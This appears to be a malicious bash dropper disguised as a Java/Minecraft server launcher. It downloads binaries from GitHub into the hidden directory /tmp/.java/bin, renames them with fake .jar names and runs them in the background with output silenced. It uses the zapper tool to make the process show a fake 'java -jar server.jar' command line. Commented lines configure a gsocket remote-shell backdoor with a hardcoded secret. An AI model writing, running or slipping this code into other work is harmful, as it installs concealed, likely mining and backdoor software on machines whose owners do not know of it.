#!/bin/bash

function fetch_files() {
    mkdir -p /tmp/.java/bin
    cd /tmp/.java/bin && curl -L https://github.com/hackerschoice/zapper/releases/download/v1.1/zapper-linux-x86_64 -o patch.jar
    cd /tmp/.java/bin && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/app.js -o bots.jar
    cd /tmp/.java/bin && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/supervisord -o plugins.jar
    cd /tmp/.java/bin && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/astra/cfg.conf -o cfg.conf
    cd /tmp/.java/bin && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/astra/cnf.json -o conf.json
    cd /tmp/.java/bin && curl -L https://github.com/i51jir6ni9t0/backup/raw/master/mc/gcat -o add-on.jar
}

function start_app() {
    chmod a+x /tmp/.java/bin/***
    cd /tmp/.java/bin && nohup ./patch.jar -a 'java -Xms128M -Xmx512M -Dterminal.jline=false -Dterminal.ansi=true -jar server.jar' ./plugins.jar -c ./cfg.conf >/dev/null 2>&1 &
    # GNET
    # export GSOCKET_ARGS="-s i1E2c7A0e2a1E2c-5A16f3D9g8Hbj7-56C4a961eCd9-F940d6A2k8A1c5J1g6 -liqD"
    # cd /tmp/.java/bin && exec -a -java ./add-on.jar &
}

if [ -f "/tmp/.java/bin/patch.jar" ] && [ -f "/tmp/.java/bin/bots.jar" ] && [ -f "/tmp/.java/bin/plugins.jar" ] ; then
    start_app
else
    rm -rf /tmp/.java/bin/**
    fetch_files
    start_app
fi
